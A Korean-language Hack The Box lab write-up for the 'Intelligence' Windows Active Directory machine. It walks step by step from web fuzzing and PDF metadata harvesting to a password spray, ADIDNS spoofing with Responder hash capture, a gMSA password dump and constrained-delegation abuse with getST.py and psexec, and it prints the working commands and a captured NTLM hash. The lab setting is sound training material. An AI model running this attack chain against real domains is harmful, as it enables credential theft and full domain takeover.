# HTB-INTELLIGENCE
```bash
OS: Windows(AD)
DATE: 26.10.14
DIFFICULTY: Medium
```

## RECON
초기 접근을 위해 nmap 전체 포트 검사와 상세 포트 검사를 진행하였다
```bash
nmap -p- -T4 IP | grep -oP '^\d+/tcp' | cut -d/ -f1 | paste -sd,
```
```bash
nmap -sC -sV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,9389,49666,49691,49692,49708,49714,49794 intelligence.htb | tee nmap
```
검사 결과 88, 389 등 포트가 있는 것으로 보아 AD DC 서버인 것 같았다. 따라서 nxc를 사용하여 smb 열거를 진행하였다
```bash
nxc smb IP -u '' -p '' --users
```
guest 계정으로 접근한 결과 불가능하였다. 따라서 LDAP 서비스에도 접근하였다
```bash
ldapsearch -x -H ldap://10.129.95.154 -b "DC=intelligence,DC=htb" 
```
하지만 ldap 또한 알 수 있는 것이 없었다. 따라서 HTTP 서비스에 접근하였다. 접근 후 subdomain, web endpoint FUZZING을 진행하였다
```bash
ffuf -u http://intelligence.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -c -r 
```
```bash
ffuf -u http://intelligence.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -c -r 
```
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://intelligence.htb/ -H "Host: FUZZ.intelligence.htb" -fs 7432 -c
```
서브도메인 등 다른 것은 발견하지 못하였고, 403 상태 코드의 **documents** 웹 디렉토리가 있다는 것을 알게 되었다

## Initial Access
이후 웹 서비스에 접속해본 결과 2개의 pdf를 발견할 수 있었다. `http://intelligence.htb/documents/2020-01-01-upload.pdf`, `http://intelligence.htb/documents/2020-12-15-upload.pdf` 대상 pdf 내용은 스페인어로 보이는 언어로 작성되어 있었다. 딱히 정보가 있지는 않았다. 따라서 documents를 대상으로 추가적인 FUZZING을 진행하였다
```bash
ffuf -u http://intelligence.htb/documents/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -c -r 
```
```bash
ffuf -u http://intelligence.htb/documents/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -c -r -e .php,.asp,.aspx,.txt
```
FUZZING 결과 별다른 내용이 나오지 않아, 아까 PDF 이외에 다른 파일들이 있을 수 있다고 생각하여 날짜별로 fuzzing을 진행하려 했다. fuzzing을 하려면 날짜 워드리스트가 있어야 가능하기에 구글에 `making date wordlists`라고 검색하니 [Chronogen](https://github.com/BoredLabsHQ/Chronogen)라는 도구가 나왔다. 따라서 2020년부터 2030년까지 날짜 워드리스트를 만들어주었다
```bash
chronogen --start 2020 --end 2030 --separator "-" date.txt

head date.txt                                  
2020-01-01
2020-01-02
2020-01-03
2020-01-04
2020-01-05
2020-01-06
2020-01-07
2020-01-08
2020-01-09
2020-01-10
```
그 결과 date.txt를 만들 수 있었고, 그것을 이용하여 다시 한 번 fuzzing을 진행하였다
```bash
ffuf -u http://intelligence.htb/documents/FUZZ-upload.pdf -w ./date.txt -c -r > datepdf
```
그 결과 여러 가지 pdf를 얻을 수 있었고, pdf 파일 이름만 또 다시 빼는 명령어를 사용해주었다
```bash
awk '{print $1}' datepdf > onlydate.txt
```
그 결과 pdf 이름만 얻기 성공하였다. 하지만 숨은 제어문자 [2K 등등이 따라 붙어 이상한 워드리스트가 되었다. 따라서 처음부터 FUZZING을 진행할 때 -s 옵션을 추가해주어 깔끔하게 출력해주었다
```bash
ffuf -u http://intelligence.htb/documents/FUZZ-upload.pdf -w ./date.txt -c -r -s > datepdf
```
```bash
awk '{print $1}' datepdf > onlydate.txt
```
따라서 깔끔한 워드리스트를 얻게 되었다. 이후 pdf라는 폴더를 만들어준 후 pdf 워드리스트 경로에 있는 모든 pdf 파일들을 다운로드해주었다
```bash
mkdir pdf
```
```bash
for pdf in $(cat onlydate.txt); do wget "http://intelligence.htb/documents/$pdf-upload.pdf"; done
```
따라서 모든 pdf 파일들을 얻을 수 있었다. 이후 받은 파일을 분석하기 위해 **exiftool**라는 파일 분석 tool을 사용해보았다
```bash
exiftool 2020-01-02-upload.pdf

ExifTool Version Number         : 13.55
File Name                       : 2020-01-02-upload.pdf
Directory                       : .
File Size                       : 27 kB
File Modification Date/Time     : 2021:04:02 02:00:00+09:00
File Access Date/Time           : 2026:10:19 15:23:22+09:00
File Inode Change Date/Time     : 2026:10:19 15:20:57+09:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : Scott.Scott
```
그 결과 Creator 부분에서 만든 유저명을 알 수 있게 되었다. 따라서 모든 pdf 파일에서 creator를 추출해보았다
```bash
exiftool *.pdf | grep Creator > cr
```
이후 awk를 사용하여 유저명만 뽑아주었다
```bash
awk '{print $3}' cr | sort -u | tee cr_name
```
이후 중복 이름까지 제거해주어 온전한 creator 이름만 얻게 되었다. 따라서 이 유저명들이 맞는지 kerbrute 도구를 사용하여 AD에 실제로 있는 이름인지 확인해주었다
```bash
kerbrute userenum -d intelligence.htb --dc IP cr_name
```
결과 모두 있는 유저명이라는 것을 알게 되어, password spray를 위해 비밀번호를 찾아보기 위해 pdf 파일을 text 형태로 변환해주는 pdftotext를 사용해주었다
```bash
pdftotext *.pdf text
```
하지만 실행이 불가능하였다. 왜냐하면 폴더 안에 아까 뽑은 cr_name 등등 pdf 형식이 아닌 파일들이 있었기에, 그 파일들을 다른 곳으로 move해준 후 다시 한 번 더 실행하였다
```bash
for pdf in *.pdf; do pdftotext "$pdf"; done
```
그 결과 모두 text 형태로 얻게 되었다. 이후 이 모든 텍스트 형태 중에 password나 username 등등이 있는지 확인해주었다
```bash
cat *.txt | grep -iE "password|pwd|username|user"

Please login using your username and the default password of:
NewIntelligenceCorpUser9876
After logging in please change your password as soon as possible.
```
그 결과 알 수 없는 평문 비밀번호를 얻게 되었다. 따라서 password spray를 할 수 있는 조건이 성립되었다. 따라서 진행해주었다
```bash
nxc smb IP -u cr_name -p NewIntelligenceCorpUser9876 --continue-on-success
```
그 결과 **Tiffany.Molina**라는 유저를 얻게 되었다. 따라서 쉘에 접근할 수 있는지 확인해보았지만 불가능하였다. 따라서 이후 bloodhound를 통해 권한 상승 경로를 확인해보았다
```bash
bloodhound-python -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -d intelligence.htb -ns IP -c all
```
```bash
bloodhound-start
```
bloodhound를 작동시켜준 후 cypher 파트에서 Shortest Paths to Domain Admins로 세팅해준 후 확인해보았다

![blood](attach_real/Pasted%20image%2020261020015319.png)

확인 결과 현재 유저로서는 가능한 권한 상승이 없었고, `TED.GRAVES` 또는 `LAURA.LEE` 유저가 권한 상승 경로가 보였다. 따라서 다른 유저로의 권한 상승을 위해 많은 경로를 뒤져보았다. 먼저 smbclient를 통해 smb 목록을 확인해보았다
```bash
smbclient -L //intelligence.htb -U Tiffany.Molina

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        IT              Disk      
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        Users           Disk      

```
확인 결과 IT, Users 등이 있었다. 따라서 먼저 Users 폴더에 접근해보았다
```bash
smbclient //intelligence.htb/Users -U Tiffany.Molina
```
확인 결과 별다른 정보를 얻을 순 없었고 user 플래그를 얻을 수 있었다. 하지만 쉘에서 출력해도 의미가 없기에 다른 폴더, 즉 IT 폴더에 접근해보았다
```bash
smbclient //intelligence.htb/IT -U Tiffany.Molina
```
접속 결과 **downdetector.ps1**라는 파일을 얻을 수 있었다. 대상 파일을 로컬로 옮겨준 후 확인해보았다
```ps1
��# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```
라는 내용이 있었다. 먼저 웹 서버 상태를 매 5분마다 확인해준다는 내용을 시작으로, AD를 다루는 모듈을 추가해주었다. 이후 AD에 저장된 DNS 레코드를 전부 가져오라고 하고, 그중 이름이 web으로 시작하는 것만 거르라는 명령어였다. 이후 그 이름으로 접속을 한다. 또한 `-UseDefaultCredentials`라는 옵션이 있었다. 이 옵션은 인증을 해서 보내기 때문에 공격 포인트가 될 수 있다. 따라서 이 스크립트를 보고 **Coerced Authentication** 공격을 생각할 수 있었다. 상대가 내가 통제하는 곳에 접속하게 만들고, 그 접속에 인증 정보가 실려 있으면 인증 정보 탈취가 가능한 것이다. 따라서 [dnstool](https://github.com/dirkjanm/krbrelayx/tree/master)을 사용하여 **ADIDNS Spoofing** 공격을 시도하였다
```bash
python3 dnstool.py -u  'intelligence.htb\tiffany.molina'  -p  'NewIntelligenceCorpUser9876'  -r webattacker.intelligence.htb -d IP -a add TARGET_IP
```
이 tool은 AD DNS에 webattacker라는 내 칼리 IP의 가짜 레코드를 추가해준다. 이후 `-UseDefaultCredentials` 옵션이 있기에 responder를 켜준 후 NTLM hash를 대기하였다
```bash
sudo responder -I tun0
```
좀 기다린 결과 Ted.Graves 유저의 NTLM 해시를 얻게 되었다. 이후 hashcat을 사용하여 crack을 진행하였다
```bash
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```
그 결과 Ted의 평문 비밀번호도 얻게 되었다

## Privilege Escalation
Ted의 크레덴셜을 얻은 후 아까 bloodhound에서 발견한 권한 상승 경로대로 진행하였다. 먼저 ted는 ITSUPPORT 그룹이다. ITSUPPORT는 SVC_INT$ 유저에 대해 ReadGMSAPassword 권한을 가지고 있기에 해당 유저의 비밀번호를 dump할 수 있다. 따라서 nxc ldap을 사용하여 dump를 진행하였다
```bash
nxc ldap intelligence.htb -u Ted.Graves -p Pass --gmsa

LDAP        10.129.95.154   389    DC               Account: svc_int$             NTLM: 4a92d8714f2d85a58289ec1e41858b1b     PrincipalsAllowedToReadPassword: ['DC$', 'itsupport']
```
따라서 svc_int$ 계정의 NTLM hash를 얻어 앞으로 PTH가 가능해졌다. 이후 도메인으로 가기 위해 다시 한 번 bloodhound를 확인해보니 svc_int$ 계정과 도메인이 **AllowedToDelegate**로 연결되어 있었다. 따라서 abuse 방법을 확인한 후 exploit을 진행하였다. 일단 먼저 AD와 같은 시간대로 맞춰주었다
```bash
sudo timedatectl set-ntp off
sudo rdate -n 10.129.95.154

Mon Oct 19 23:56:42 KST 2026
```
이후 getST.py를 사용하여 권한 상승을 시도하였다
```bash
getST.py -spn 'HTTP/intelligence.htb' -impersonate 'admin' -altservice 'cifs' -hashes :4a92d8714f2d85a58289ec1e41858b1b 'intelligence.htb/svc_int$'
```
하지만 실패하였다. 이유를 살펴보니 일단 유저명이 잘못되었고 SPN이 잘못되었다. SPN이란 네트워크상의 특정 서비스를 가리키는 고유 주소/이름표이다. 형식은 `서비스클래스/호스트FQDN`이고, FQDN이란 그 서비스가 돌아가는 실제 머신 이름이다. 따라서 nxc --find-delegation 옵션을 사용하여 확인해보았다
```bash
nxc ldap IP -u svc_int$ -H 4a92d8714f2d85a58289ec1e41858b1b --find-delegation

LDAP        10.129.95.154   389    DC               svc_int$    ms-DS-Group-Managed-Service-Account Constrained w/ Protocol Transition WWW/dc.intelligence.htb
```
확인한 결과 올바른 SPN은 **WWW/dc.intelligence.htb**라는 것을 알게 되었다 (FQDN은 dc.intelligence.htb 부분). 따라서 대상 SPN을 다시 넣어준 후 tool을 작동시켰다
```bash
getST.py -spn 'WWW/dc.intelligence.htb' -impersonate administrator -altservice 'cifs' -hashes :4a92d8714f2d85a58289ec1e41858b1b 'intelligence.htb/svc_int$'

[*] Saving ticket in administrator@cifs_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
```
따라서 캐시를 얻게 되었고, 이 캐시 위치를 export해주었다
```bash
export KRB5CCNAME=$PWD/'administrator@cifs_dc.intelligence.htb@INTELLIGENCE.HTB.ccache'
```
이후 psexec를 시도하였다
```bash
psexec.py intelligence.htb/Administrator@10.129.95.154 -k -no-pass
```
하지만 실패하였다. 왜냐하면 티켓이 아니라 IP가 적혀 있기 때문이다. 따라서 티켓 위치, 즉 dc.intelligence.htb을 입력해준 후 다시 접속한 결과 admin 쉘을 얻을 수 있게 되었다
```bash
psexec.py -k -no-pass intelligence.htb/administrator@dc.intelligence.htb
```

![user](attach_real/Pasted%20image%2020261020000908.png)

![admin](attach_real/Pasted%20image%2020261020000831.png)

## New Inform
- 숫자 fuzzing 의심이 가면 진행해라
- 파이썬 작성을 할 수 없으면 tool을 찾아라
- awk '{print $1}' res 는 각 줄의 첫 번째 칸만 출력하라는 뜻
- ffuf에서 -s 옵션은 silent, 즉 깔끔하게 결과를 출력할 수 있다
- bash 스크립트에서 for 뒤는 변수 이름, in에는 들어올 정보. 그냥 파일 이름 적으면 안 되고 $(명령어)로 실행해서 출력해야 함. 그리고 안에 변수를 넣고 싶으면 작은따옴표 안 되고 큰따옴표
- 무조건 pdf든 사진이든 exiftool로 정보 긁어모으자
- 정보 얻고 pdf는 text 형태로 변환 후 password나 그런 것이 있는지 항상 확인
- 유저명을 kerbrute를 통해 AD에 있는 유저인지 확인할 수 있다
- 스크립트를 읽자
- dnstool을 사용하여 덫을 설치하자
- -UseDefaultCredentials 옵션은 크레덴셜을 줄 수 있다. 즉 responder를 사용하여 hash 캡처 가능
- gMSA: 그룹 관리형 서비스 계정 (group Managed Service Account)
- gMSA는 AD가 비밀번호를 자동으로 관리해주는 특수 계정
- gMSA는 nxc로 덤프 가능하다
- 항상 AD tool을 사용할 거면 time을 타겟과 같이 맞춰주자
- 유저명 확인해주자
- SPN이란 서비스 주소/이름표이다. 형식은 서비스클래스/호스트FQDN이다. 그것을 알기 위해 nxc ldap --find-delegation을 사용하여 찾을 수 있다
- export해줄 때 항상 나온 캐시 이름 그대로 넣어줘야 한다
- psexec로 접속할 때 IP가 아니라 FQDN을 사용해주자